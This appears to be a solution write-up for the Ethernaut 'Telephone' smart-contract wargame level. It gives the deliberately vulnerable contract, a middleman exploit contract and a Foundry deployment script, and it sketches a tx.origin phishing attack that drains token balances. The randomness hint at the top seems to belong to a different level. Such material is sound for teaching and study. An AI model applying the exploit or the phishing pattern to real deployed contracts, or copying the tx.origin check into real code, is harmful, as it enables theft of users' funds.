# Level 4 - Telephone ⏺

https://ethernaut.openzeppelin.com/level/3

### Level Setup

{% hint style="info" %}
Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/Telephone.sol" %}

{% code lineNumbers="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
{% endcode %}

### Exploit

The contract is vulnerable because the `msg.sender` is the address that sent the transaction to interact with the contract, but this is only the final address if the transaction involved multiple contracts.

1. Create a middleman contract so that `x.origin != msg.sender`.

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-4

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-4

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/src/Level4.sol" %}

{% code title="src/Level4.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

// ================================================================
// │                      LEVEL 4 - TELEPHONE                     │
// ================================================================
contract TelephoneMiddleman {
    function run(address _targetContractAddress) public {
        ITelephone(_targetContractAddress).changeOwner(msg.sender);
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/main/script/Level4.s.sol" %}

{% code title="script/Level4.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";
import {TelephoneMiddleman} from "../src/Level4.sol";

// ================================================================
// │                      LEVEL 4 - TELEPHONE                     │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        TelephoneMiddleman telephoneMiddleman = new TelephoneMiddleman();
        telephoneMiddleman.run(targetContractAddress);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```solidity
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```solidity
function () payable {
  token.transfer(attackerAddress, 10000);
}
```

3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
{% endhint %}

### Notes

* [Difference between `tx.origin` and `msg.sender`](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)
* In a simple call chain `A->B->C->D` inside `D` `msg.sender` will be `C` and `tx.origin` will be `A`.
